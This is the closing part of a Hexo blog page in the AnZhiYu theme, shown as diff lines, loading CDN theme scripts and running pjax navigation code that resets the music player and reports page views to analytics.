+</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+  // removeEventListener scroll 
+  anzhiyu.removeGlobalFnEvent('pjax')
+  anzhiyu.removeGlobalFnEvent('themeChange')
+
+  document.getElementById('rightside').classList.remove('rightside-show')
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+})
+
+document.addEventListener('pjax:error', e => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404')
+  }
+})</script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>
